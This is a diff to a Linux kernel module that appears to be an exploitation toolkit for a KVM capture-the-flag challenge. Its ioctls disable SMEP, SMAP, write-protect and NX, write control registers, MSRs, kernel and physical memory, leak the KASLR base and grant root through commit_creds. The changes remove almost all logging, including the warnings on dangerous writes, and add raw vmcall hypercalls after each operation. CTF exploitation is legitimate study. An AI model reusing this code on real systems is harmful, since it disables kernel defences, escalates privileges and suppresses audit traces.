@@ -74,7 +74,6 @@ static int kallsyms_lookup_init(void) {
     };
 
     if (register_kprobe(&kp) < 0) {
-        printk(KERN_ERR "%s: Failed to register kprobe for kallsyms_lookup_name\n", DRIVER_NAME);
         return -1;
     }
 
@@ -82,7 +81,6 @@ static int kallsyms_lookup_init(void) {
     unregister_kprobe(&kp);
 
     if (!kallsyms_lookup_name_ptr) {
-        printk(KERN_ERR "%s: Could not find kallsyms_lookup_name\n", DRIVER_NAME);
         return -1;
     }
 
@@ -140,7 +138,6 @@ static int init_kaslr_slide(void) {
     } else if (_text_addr) {
         g_kernel_text_base = _text_addr;
     } else {
-        printk(KERN_WARNING "%s: Could not find kernel text symbols\n", DRIVER_NAME);
         return -ENOENT;
     }
 
@@ -152,13 +149,8 @@ static int init_kaslr_slide(void) {
 
     g_kaslr_initialized = true;
 
-    printk(KERN_INFO "%s: Kernel text base: 0x%lx\n", DRIVER_NAME, g_kernel_text_base);
-    printk(KERN_INFO "%s: KASLR slide: 0x%lx\n", DRIVER_NAME, g_kaslr_slide);
-    printk(KERN_INFO "%s: Kernel base: 0x%lx\n", DRIVER_NAME, g_kernel_base);
-
     return 0;
 #else
-    printk(KERN_WARNING "%s: KALLSYMS not enabled, KASLR detection may not work\n", DRIVER_NAME);
     return -ENOENT;
 #endif
 }
@@ -172,14 +164,6 @@ static int cache_important_symbols(void) {
     g_symbol_swapper_pg_dir = KALLSYMS_LOOKUP_NAME("swapper_pg_dir");
     g_symbol_init_mm = KALLSYMS_LOOKUP_NAME("init_mm");
     g_symbol_write_flag = KALLSYMS_LOOKUP_NAME("write_flag"); /* CTF specific */
-
-    printk(KERN_INFO "%s: Cached symbols:\n", DRIVER_NAME);
-    printk(KERN_INFO "  commit_creds: 0x%lx\n", g_symbol_commit_creds);
-    printk(KERN_INFO "  prepare_kernel_cred: 0x%lx\n", g_symbol_prepare_kernel_cred);
-    printk(KERN_INFO "  init_task: 0x%lx\n", g_symbol_init_task);
-    printk(KERN_INFO "  swapper_pg_dir: 0x%lx\n", g_symbol_swapper_pg_dir);
-    printk(KERN_INFO "  init_mm: 0x%lx\n", g_symbol_init_mm);
-    printk(KERN_INFO "  write_flag: 0x%lx\n", g_symbol_write_flag);
 
     return 0;
 #else
@@ -228,11 +212,6 @@ static unsigned long lookup_symbol(const char *name) {
 
     #if IS_ENABLED(CONFIG_KALLSYMS)
         addr = KALLSYMS_LOOKUP_NAME(name);
-        if (addr) {
-            printk(KERN_DEBUG "%s: Symbol '%s' = 0x%lx\n", DRIVER_NAME, name, addr);
-        } else {
-            printk(KERN_DEBUG "%s: Symbol '%s' not found\n", DRIVER_NAME, name);
-        }
     #endif
 
     return addr;
@@ -451,8 +430,6 @@ static void disable_smep(void) {
     unsigned long new_cr4 = current_cr4 & ~(1UL << 20);  // Clear SMEP bit (20)
     my_write_cr4(new_cr4);
     g_smep_disabled = true;
-    printk(KERN_WARNING "%s: SMEP DISABLED! (CR4: 0x%lx -> 0x%lx)\n",
-           DRIVER_NAME, current_cr4, new_cr4);
 #endif
 }
 
@@ -463,8 +440,6 @@ static void enable_smep(void) {
     unsigned long new_cr4 = current_cr4 | (1UL << 20);  // Set SMEP bit (20)
     my_write_cr4(new_cr4);
     g_smep_disabled = false;
-    printk(KERN_WARNING "%s: SMEP ENABLED! (CR4: 0x%lx -> 0x%lx)\n",
-           DRIVER_NAME, current_cr4, new_cr4);
 #endif
 }
 
@@ -476,8 +451,6 @@ static void disable_smap(void) {
     unsigned long new_cr4 = current_cr4 & ~(1UL << 21);  // Clear SMAP bit (21)
     my_write_cr4(new_cr4);
     g_smap_disabled = true;
-    printk(KERN_WARNING "%s: SMAP DISABLED! (CR4: 0x%lx -> 0x%lx)\n",
-           DRIVER_NAME, current_cr4, new_cr4);
 #endif
 }
 
@@ -488,8 +461,6 @@ static void enable_smap(void) {
     unsigned long new_cr4 = current_cr4 | (1UL << 21);  // Set SMAP bit (21)
     my_write_cr4(new_cr4);
     g_smap_disabled = false;
-    printk(KERN_WARNING "%s: SMAP ENABLED! (CR4: 0x%lx -> 0x%lx)\n",
-           DRIVER_NAME, current_cr4, new_cr4);
 #endif
 }
 
@@ -501,8 +472,6 @@ static void disable_wp(void) {
     unsigned long new_cr0 = current_cr0 & ~(1UL << 16);  // Clear WP bit (16)
     my_write_cr0(new_cr0);
     g_wp_disabled = true;
-    printk(KERN_WARNING "%s: WP DISABLED! (CR0: 0x%lx -> 0x%lx)\n",
-           DRIVER_NAME, current_cr0, new_cr0);
 #endif
 }
 
@@ -513,8 +482,6 @@ static void enable_wp(void) {
     unsigned long new_cr0 = current_cr0 | (1UL << 16);  // Set WP bit (16)
     my_write_cr0(new_cr0);
     g_wp_disabled = false;
-    printk(KERN_WARNING "%s: WP ENABLED! (CR0: 0x%lx -> 0x%lx)\n",
-           DRIVER_NAME, current_cr0, new_cr0);
 #endif
 }
 
@@ -535,8 +502,6 @@ static void enable_nx(void) {
         u64 new_efer = current_efer | EFER_NXE;  // Set NXE bit (11)
         my_wrmsr(MSR_EFER, new_efer);
         g_nx_enabled = true;
-        printk(KERN_WARNING "%s: NX ENABLED! (EFER: 0x%llx -> 0x%llx)\n",
-               DRIVER_NAME, current_efer, new_efer);
     }
 #endif
 }
@@ -548,8 +513,6 @@ static void disable_nx(void) {
     u64 new_efer = current_efer & ~EFER_NXE;  // Clear NXE bit (11)
     my_wrmsr(MSR_EFER, new_efer);
     g_nx_enabled = false;
-    printk(KERN_WARNING "%s: NX DISABLED! (EFER: 0x%llx -> 0x%llx)\n",
-           DRIVER_NAME, current_efer, new_efer);
 #endif
 }
 
@@ -557,9 +520,6 @@ static void disable_nx(void) {
 static void my_read_cr0_debug(void) {
 #ifdef CONFIG_X86
     unsigned long cr0 = my_read_cr0();
-    printk(KERN_INFO "%s: CR0 = 0x%lx\n", DRIVER_NAME, cr0);
-    printk(KERN_INFO "%s: CR0.WP (bit 16) = %d\n",
-           DRIVER_NAME, (cr0 & (1UL << 16)) ? 1 : 0);
 #endif
 }
 
@@ -569,19 +529,6 @@ static void check_protection_status(void) {
     unsigned long cr0 = my_read_cr0();
     unsigned long cr4 = my_read_cr4();
     u64 efer = my_rdmsr(MSR_EFER);
-
-    printk(KERN_INFO "%s: === PROTECTION STATUS ===\n", DRIVER_NAME);
-    printk(KERN_INFO "%s: CR0: 0x%lx\n", DRIVER_NAME, cr0);
-    printk(KERN_INFO "%s: CR0.WP (bit 16): %s\n",
-           DRIVER_NAME, (cr0 & (1UL << 16)) ? "ENABLED" : "DISABLED");
-    printk(KERN_INFO "%s: CR4: 0x%lx\n", DRIVER_NAME, cr4);
-    printk(KERN_INFO "%s: CR4.SMEP (bit 20): %s\n",
-           DRIVER_NAME, (cr4 & (1UL << 20)) ? "ENABLED" : "DISABLED");
-    printk(KERN_INFO "%s: CR4.SMAP (bit 21): %s\n",
-           DRIVER_NAME, (cr4 & (1UL << 21)) ? "ENABLED" : "DISABLED");
-    printk(KERN_INFO "%s: EFER: 0x%llx\n", DRIVER_NAME, efer);
-    printk(KERN_INFO "%s: EFER.NXE (bit 11): %s\n",
-           DRIVER_NAME, (efer & EFER_NXE) ? "ENABLED" : "DISABLED");
 #endif
 }
 
@@ -590,21 +537,15 @@ static void restore_protections(void) {
 #ifdef CONFIG_X86
     if (g_smep_disabled || g_smap_disabled) {
         my_write_cr4(g_original_cr4);
-        printk(KERN_INFO "%s: CR4 protections restored (CR4: 0x%lx)\n",
-               DRIVER_NAME, g_original_cr4);
         g_smep_disabled = false;
         g_smap_disabled = false;
     }
     if (g_wp_disabled) {
         my_write_cr0(g_original_cr0);
-        printk(KERN_INFO "%s: WP restored (CR0: 0x%lx)\n",
-               DRIVER_NAME, g_original_cr0);
         g_wp_disabled = false;
     }
     if (g_nx_enabled) {
         my_wrmsr(MSR_EFER, g_original_efer);
-        printk(KERN_INFO "%s: NX restored to original state (EFER: 0x%llx)\n",
-               DRIVER_NAME, g_original_efer);
         g_nx_enabled = false;
     }
 #endif
@@ -625,7 +566,6 @@ static void escalate_privileges(void) {
         void *cred = prepare_kernel_cred(0);
         if (cred) {
             commit_creds(cred);
-            printk(KERN_WARNING "%s: PRIVILEGES ESCALATED!\n", DRIVER_NAME);
         }
     }
 #endif
@@ -854,57 +794,63 @@ struct exploit_primitive {
 #define IOCTL_CHECK_STATUS       0x102A
 
 /* ========================================================================
- * Helper Functions - QUIET VERSION
+ * Hypercall Implementation - NEW VERSION
  * ======================================================================== */
 
-static long force_hypercall(void) {
+/**
+ * Executes a KVM hypercall on x86_64.
+ * RAX: Hypercall Number
+ * Returns value stored in RAX.
+ */
+static inline long kvm_hypercall(unsigned int nr) {
     long ret;
-    u64 start = ktime_get_ns();
-    ret = kvm_hypercall0(KVM_HC_VAPIC_POLL_IRQ);
-    u64 end = ktime_get_ns();
 
-    /* Only log hypercalls if they return non-zero (interesting) */
-    if (ret != 0) {
-        printk(KERN_DEBUG "%s: HYPERCALL returned non-zero | latency=%llu ns | ret=%ld\n",
-               DRIVER_NAME, end - start, ret);
+    asm volatile(
+        "vmcall"
+        : "=a"(ret)      /* Output: RAX */
+        : "a"(nr)        /* Input: RAX = hypercall number */
+        : "memory"       /* Clobbers */
+    );
+
+    return ret;
+}
+
+/* Helper function to trigger hypercall after operations */
+static long trigger_hypercall(void) {
+    long ret;
+    unsigned int hypercalls[] = {100, 101, 102, 103};
+
+    /* Try different hypercall numbers */
+    for (int i = 0; i < 4; i++) {
+        ret = kvm_hypercall(hypercalls[i]);
+
+        /* Only log if return value is interesting (non-zero and not -1000) */
+        if (ret != 0 && ret != -1000) {
+            printk(KERN_INFO "%s: Hypercall #%u returned: %ld\n",
+                   DRIVER_NAME, hypercalls[i], ret);
+        }
     }
+
     return ret;
 }
 
 static long do_hypercall(struct hypercall_args *args) {
     unsigned long nr = args->nr;
-    unsigned long a0 = args->arg0;
-    unsigned long a1 = args->arg1;
-    unsigned long a2 = args->arg2;
-    unsigned long a3 = args->arg3;
-
     long ret;
-    u64 start = ktime_get_ns();
 
-    if (a0 == 0 && a1 == 0 && a2 == 0 && a3 == 0) {
-        ret = kvm_hypercall0(nr);
-    } else if (a1 == 0 && a2 == 0 && a3 == 0) {
-        ret = kvm_hypercall1(nr, a0);
-    } else if (a2 == 0 && a3 == 0) {
-        ret = kvm_hypercall2(nr, a0, a1);
-    } else if (a3 == 0) {
-        ret = kvm_hypercall3(nr, a0, a1, a2);
-    } else {
-        ret = kvm_hypercall4(nr, a0, a1, a2, a3);
+    ret = kvm_hypercall(nr);
+
+    /* Only log if return value is interesting (non-zero and not -1000) */
+    if (ret != 0 && ret != -1000) {
+        printk(KERN_INFO "%s: Hypercall(%lu) returned: %ld\n",
+               DRIVER_NAME, nr, ret);
     }
 
-    u64 end = ktime_get_ns();
-
-    /* Only log hypercalls if they return non-zero */
-    if (ret != 0) {
-        printk(KERN_DEBUG "%s: HYPERCALL(%lu) returned non-zero | latency=%llu ns | ret=%ld\n",
-               DRIVER_NAME, nr, end - start, ret);
-    }
     return ret;
 }
 
 /* ========================================================================
- * IOCTL Handler - QUIET VERSION
+ * IOCTL Handler - MINIMAL LOGGING VERSION
  * ======================================================================== */
 
 static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
@@ -914,33 +860,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
     unsigned long len_to_copy;
     unsigned char *k_mmio_buffer = NULL;
 
-    /* Only log IOCTL for important/extreme operations */
-    switch (cmd) {
-        case IOCTL_DISABLE_SMEP:
-        case IOCTL_DISABLE_SMAP:
-        case IOCTL_DISABLE_WP:
-        case IOCTL_ENABLE_NX:
-        case IOCTL_DISABLE_NX:
-        case IOCTL_LOOKUP_SYMBOL:
-        case IOCTL_GET_KASLR_SLIDE:
-        case IOCTL_GET_KERNEL_BASE:
-        case IOCTL_WRITE_CR4:
-        case IOCTL_WRITE_MSR:
-        case IOCTL_WRITE_EFER:
-        case IOCTL_WRITE_PHYSICAL:
-        case IOCTL_WRITE_KERNEL_MEM:
-        case IOCTL_ENABLE_SMEP:
-        case IOCTL_ENABLE_SMAP:
-        case IOCTL_ENABLE_WP:
-        case IOCTL_WRITE_CR0:
-        case IOCTL_ESCALATE_PRIVILEGES:
-            printk(KERN_DEBUG "%s: IOCTL cmd=0x%x\n", DRIVER_NAME, cmd);
-            break;
-        default:
-            /* Don't log routine IOCTLs */
-            break;
-    }
-
+    /* No logging for IOCTL commands */
     switch (cmd) {
 
         case IOCTL_LOOKUP_SYMBOL: {
@@ -953,42 +873,38 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             /* Ensure null termination */
             req.name[MAX_SYMBOL_NAME - 1] = '\0';
 
-            printk(KERN_DEBUG "%s: Looking up symbol '%s'\n", DRIVER_NAME, req.name);
-
             /* Look up the symbol using kallsyms */
             req.address = lookup_symbol(req.name);
 
             if (req.address == 0) {
-                printk(KERN_WARNING "%s: Symbol '%s' not found\n", DRIVER_NAME, req.name);
                 return -ENOENT;
             }
-
-            printk(KERN_INFO "%s: Symbol '%s' resolved to 0x%lx\n",
-                   DRIVER_NAME, req.name, req.address);
 
             /* Return address to userspace */
             if (copy_to_user((struct symbol_lookup __user *)arg, &req, sizeof(req))) {
                 return -EFAULT;
             }
 
+            trigger_hypercall(); /* Trigger hypercall after operation */
             return 0;
         }
 
         case IOCTL_GET_KASLR_SLIDE: {
-            printk(KERN_DEBUG "%s: GET_KASLR_SLIDE called\n", DRIVER_NAME);
             if (copy_to_user((unsigned long __user *)arg, &g_kaslr_slide, sizeof(g_kaslr_slide))) {
                 return -EFAULT;
             }
+            trigger_hypercall(); /* Trigger hypercall after operation */
             return 0;
         }
 
         case IOCTL_GET_KERNEL_BASE: {
-            printk(KERN_DEBUG "%s: GET_KERNEL_BASE called\n", DRIVER_NAME);
             if (copy_to_user((unsigned long __user *)arg, &g_kernel_base, sizeof(g_kernel_base))) {
                 return -EFAULT;
             }
+            trigger_hypercall(); /* Trigger hypercall after operation */
             return 0;
         }
+
         case IOCTL_READ_PORT:
             if (copy_from_user(&p_io_data_kernel, (struct port_io_data __user *)arg, sizeof(p_io_data_kernel))) {
                 return -EFAULT;
@@ -1004,7 +920,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             if (copy_to_user((struct port_io_data __user *)arg, &p_io_data_kernel, sizeof(p_io_data_kernel))) {
                 return -EFAULT;
             }
-            force_hypercall(); /* Quiet version */
+            trigger_hypercall(); /* Trigger hypercall after operation */
             break;
 
         case IOCTL_WRITE_PORT:
@@ -1019,7 +935,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
                 case 2: outw((u16)p_io_data_kernel.value, p_io_data_kernel.port); break;
                 case 4: outl((u32)p_io_data_kernel.value, p_io_data_kernel.port); break;
             }
-            force_hypercall(); /* Quiet version */
+            trigger_hypercall(); /* Trigger hypercall after operation */
             break;
 
         case IOCTL_READ_MMIO: {
@@ -1052,7 +968,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
 
             kfree(kbuf);
             iounmap(mmio);
-            force_hypercall(); /* Quiet version */
+            trigger_hypercall(); /* Trigger hypercall after operation */
             return 0;
         }
 
@@ -1109,7 +1025,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             }
 
             iounmap(mapped_addr);
-            force_hypercall(); /* Quiet version */
+            trigger_hypercall(); /* Trigger hypercall after operation */
             return 0;
         }
 
@@ -1128,17 +1044,11 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             /* Apply KASLR slide automatically */
             actual_addr = apply_kaslr_slide(req.kernel_addr);
 
-            /* Only log if it's an interesting address or large read */
-            if (req.length > 1024 || (req.kernel_addr & 0xfffff) == 0) {
-                printk(KERN_DEBUG "%s: READ_KERNEL_MEM: 0x%lx -> 0x%lx (size: %lu)\n",
-                       DRIVER_NAME, req.kernel_addr, actual_addr, req.length);
-            }
-
             if (copy_to_user(req.user_buf, (void *)actual_addr, req.length)) {
                 return -EFAULT;
             }
 
-            force_hypercall(); /* Quiet version */
+            trigger_hypercall(); /* Trigger hypercall after operation */
             break;
         }
 
@@ -1158,10 +1068,6 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             /* Apply KASLR slide automatically */
             actual_addr = apply_kaslr_slide(req.kernel_addr);
 
-            /* Log all writes since they're more dangerous */
-            printk(KERN_WARNING "%s: WRITE_KERNEL_MEM: 0x%lx -> 0x%lx (size: %lu)\n",
-                   DRIVER_NAME, req.kernel_addr, actual_addr, req.length);
-
             tmp = kmalloc(req.length, GFP_KERNEL);
             if (!tmp) {
                 return -ENOMEM;
@@ -1174,7 +1080,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
 
             memcpy((void *)actual_addr, tmp, req.length);
             kfree(tmp);
-            force_hypercall(); /* Quiet version */
+            trigger_hypercall(); /* Trigger hypercall after operation */
             break;
         }
 
@@ -1207,7 +1113,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
                 return -EFAULT;
             }
 
-            force_hypercall(); /* Quiet version */
+            trigger_hypercall(); /* Trigger hypercall after operation */
             break;
         }
 
@@ -1218,7 +1124,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
                 g_vq_phys_addr = 0;
                 g_vq_pfn = 0;
             }
-            force_hypercall(); /* Quiet version */
+            trigger_hypercall(); /* Trigger hypercall after operation */
             break;
         }
 
@@ -1246,12 +1152,12 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             kernel_desc_ptr_local->flags = cpu_to_le16(user_desc_data_kernel.flags);
             kernel_desc_ptr_local->next = cpu_to_le16(user_desc_data_kernel.next_idx);
 
-            force_hypercall(); /* Quiet version */
+            trigger_hypercall(); /* Trigger hypercall after operation */
             break;
         }
 
         case IOCTL_TRIGGER_HYPERCALL: {
-            long ret = force_hypercall();
+            long ret = trigger_hypercall();
 
             if (copy_to_user((long __user *)arg, &ret, sizeof(ret))) {
                 return -EFAULT;
@@ -1290,7 +1196,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             }
 
             kfree(tmp);
-            force_hypercall(); /* Quiet version */
+            trigger_hypercall(); /* Trigger hypercall after operation */
             return 0;
         }
 
@@ -1322,7 +1228,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
 
             memcpy((void *)actual_addr, tmp, wa_req.size);
             kfree(tmp);
-            force_hypercall(); /* Quiet version */
+            trigger_hypercall(); /* Trigger hypercall after operation */
             return 0;
         }
             case IOCTL_GET_CURRENT_TASK: {
@@ -1346,9 +1252,6 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             break;
         }
 
-        /* ========================================================================
-         * FIXED VIRT_TO_PHYS IMPLEMENTATION
-         * ======================================================================== */
         case IOCTL_VIRT_TO_PHYS: {
             unsigned long va, pa = 0;
 
@@ -1363,12 +1266,8 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             /* Only handle kernel addresses */
             if (is_kernel_address(va)) {
                 pa = virt_to_phys((void *)va);
-                printk(KERN_DEBUG "%s: VIRT_TO_PHYS: 0x%lx -> 0x%lx\n",
-                    DRIVER_NAME, va, pa);
                 return copy_to_user((void __user *)arg, &pa, sizeof(pa)) ? -EFAULT : 0;
             } else {
-                printk(KERN_WARNING "%s: VIRT_TO_PHYS only supports kernel addresses: 0x%lx\n",
-                    DRIVER_NAME, va);
                 return -EINVAL;
             }
         }
@@ -1385,8 +1284,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
                 /* Use cached symbol address */
                 actual_addr = g_symbol_write_flag;
                 *((unsigned long *)actual_addr) = val;
-                printk(KERN_DEBUG "%s: WRITE_FLAG_ADDR: wrote 0x%lx to 0x%lx\n",
-                       DRIVER_NAME, val, actual_addr);
+                trigger_hypercall(); /* Trigger hypercall after operation */
                 return 0;
             } else {
                 return -ENOENT;
@@ -1417,8 +1315,6 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
 
             /* Apply KASLR slide automatically */
             actual_addr = apply_kaslr_slide(req.dst_va);
-            printk(KERN_WARNING "%s: PATCH: 0x%lx -> 0x%lx (size: %lu)\n",
-                   DRIVER_NAME, req.dst_va, actual_addr, req.size);
 
             kbuf = kmalloc(req.size, GFP_KERNEL);
             if (!kbuf) {
@@ -1434,40 +1330,38 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             memcpy((void *)actual_addr, kbuf, req.size);
 
             kfree(kbuf);
+            trigger_hypercall(); /* Trigger hypercall after operation */
             return 0;
         }
 
-        /* ========================================================================
-         * KVMCTF Extreme Exploitation Primitives - FIXED VERSION
-         * ======================================================================== */
         case IOCTL_DISABLE_SMEP:
             disable_smep();
-            force_hypercall(); /* Quiet version */
+            trigger_hypercall(); /* Trigger hypercall after operation */
             return 0;
 
         case IOCTL_ENABLE_SMEP:
             enable_smep();
-            force_hypercall(); /* Quiet version */
+            trigger_hypercall(); /* Trigger hypercall after operation */
             return 0;
 
         case IOCTL_DISABLE_SMAP:
             disable_smap();
-            force_hypercall(); /* Quiet version */
+            trigger_hypercall(); /* Trigger hypercall after operation */
             return 0;
 
         case IOCTL_ENABLE_SMAP:
             enable_smap();
-            force_hypercall(); /* Quiet version */
+            trigger_hypercall(); /* Trigger hypercall after operation */
             return 0;
 
         case IOCTL_DISABLE_WP:
             disable_wp();
-            force_hypercall(); /* Quiet version */
+            trigger_hypercall(); /* Trigger hypercall after operation */
             return 0;
 
         case IOCTL_ENABLE_WP:
             enable_wp();
-            force_hypercall(); /* Quiet version */
+            trigger_hypercall(); /* Trigger hypercall after operation */
             return 0;
 
         case IOCTL_READ_CR4: {
@@ -1485,9 +1379,8 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             if (copy_from_user(&cr4, (void __user *)arg, sizeof(cr4))) {
                 return -EFAULT;
             }
-            /* Log CR4 writes since they're security critical */
-            printk(KERN_WARNING "%s: CR4 WRITE: 0x%lx\n", DRIVER_NAME, cr4);
             my_write_cr4(cr4);
+            trigger_hypercall(); /* Trigger hypercall after operation */
             return 0;
 #else
             return -ENOSYS;
@@ -1509,9 +1402,8 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             if (copy_from_user(&cr0, (void __user *)arg, sizeof(cr0))) {
                 return -EFAULT;
             }
-            /* Log CR0 writes since they're security critical */
-            printk(KERN_WARNING "%s: CR0 WRITE: 0x%lx\n", DRIVER_NAME, cr0);
             my_write_cr0(cr0);
+            trigger_hypercall(); /* Trigger hypercall after operation */
             return 0;
 #else
             return -ENOSYS;
@@ -1537,10 +1429,8 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             if (copy_from_user(&msr_req, (void __user *)arg, sizeof(msr_req))) {
                 return -EFAULT;
             }
-            /* Log MSR writes since they're very dangerous */
-            printk(KERN_WARNING "%s: MSR WRITE: 0x%x = 0x%llx\n",
-                   DRIVER_NAME, msr_req.msr, msr_req.value);
             my_wrmsr(msr_req.msr, msr_req.value);
+            trigger_hypercall(); /* Trigger hypercall after operation */
             return 0;
 #else
             return -ENOSYS;
@@ -1575,6 +1465,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             }
 
             kfree(kbuf);
+            trigger_hypercall(); /* Trigger hypercall after operation */
             return 0;
         }
 
@@ -1589,10 +1480,6 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             if (!phys_req.phys_addr || !phys_req.size || !phys_req.user_buffer) {
                 return -EINVAL;
             }
-
-            /* Log physical memory writes - very dangerous! */
-            printk(KERN_WARNING "%s: WRITE_PHYSICAL: 0x%lx (size: %lu)\n",
-                   DRIVER_NAME, phys_req.phys_addr, phys_req.size);
 
             kbuf = kmalloc(phys_req.size, GFP_KERNEL);
             if (!kbuf) {
@@ -1610,6 +1497,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             }
 
             kfree(kbuf);
+            trigger_hypercall(); /* Trigger hypercall after operation */
             return 0;
         }
 
@@ -1619,19 +1507,16 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             return alloc_root_pages(user_pages, count);
         }
 
-        /* ========================================================================
-         * NX Bit Control
-         * ======================================================================== */
         case IOCTL_ENABLE_NX:
             enable_nx();
             check_protection_status();
-            force_hypercall(); /* Quiet version */
+            trigger_hypercall(); /* Trigger hypercall after operation */
             return 0;
 
         case IOCTL_DISABLE_NX:
             disable_nx();
             check_protection_status();
-            force_hypercall(); /* Quiet version */
+            trigger_hypercall(); /* Trigger hypercall after operation */
             return 0;
 
         case IOCTL_READ_EFER: {
@@ -1649,9 +1534,8 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             if (copy_from_user(&efer, (void __user *)arg, sizeof(efer))) {
                 return -EFAULT;
             }
-            /* Log EFER writes since they're very dangerous */
-            printk(KERN_WARNING "%s: EFER WRITE: 0x%llx\n", DRIVER_NAME, efer);
             my_wrmsr(MSR_EFER, efer);
+            trigger_hypercall(); /* Trigger hypercall after operation */
             return 0;
 #else
             return -ENOSYS;
@@ -1660,10 +1544,15 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
 
         case IOCTL_CHECK_STATUS:
             check_protection_status();
+            trigger_hypercall(); /* Trigger hypercall after operation */
+            return 0;
+
+        case IOCTL_ESCALATE_PRIVILEGES:
+            escalate_privileges();
+            trigger_hypercall(); /* Trigger hypercall after operation */
             return 0;
 
         default:
-            printk(KERN_ERR "%s: Unknown IOCTL command: 0x%x\n", DRIVER_NAME, cmd);
             return -EINVAL;
     }
 
@@ -1696,12 +1585,6 @@ static int __init mod_init(void) {
     g_smap_disabled = false;
     g_wp_disabled = false;
     g_nx_enabled = false;
-
-#if HAS_SET_MEMORY_FUNCS
-    printk(KERN_INFO "%s: Using native set_memory functions\n", DRIVER_NAME);
-#else
-    printk(KERN_INFO "%s: Using fallback page table manipulation\n", DRIVER_NAME);
-#endif
 
     /* Initialize kallsyms lookup for modern kernels */
     ret = kallsyms_lookup_init();
@@ -1752,8 +1635,6 @@ static int __init mod_init(void) {
 
     printk(KERN_INFO "%s: Module loaded. Device /dev/%s created with major %d\n",
            DRIVER_NAME, DEVICE_FILE_NAME, major_num);
-    printk(KERN_INFO "%s: KASLR slide: 0x%lx, Kernel base: 0x%lx\n",
-           DRIVER_NAME, g_kaslr_slide, g_kernel_base);
 
     return 0;
 }
@@ -1766,8 +1647,6 @@ static void __exit mod_exit(void) {
 
     /* Free VQ page if allocated */
     if (g_vq_virt_addr) {
-        printk(KERN_INFO "%s: Freeing VQ page (virt: %p, phys: 0x%llx)\n",
-               DRIVER_NAME, g_vq_virt_addr, (unsigned long long)g_vq_phys_addr);
         free_pages((unsigned long)g_vq_virt_addr, VQ_PAGE_ORDER);
         g_vq_virt_addr = NULL;
         g_vq_phys_addr = 0;
@@ -1793,4 +1672,4 @@ static void __exit mod_exit(void) {
 }
 
 module_init(mod_init);
-module_exit(mod_exit)
+module_exit(mod_exit);
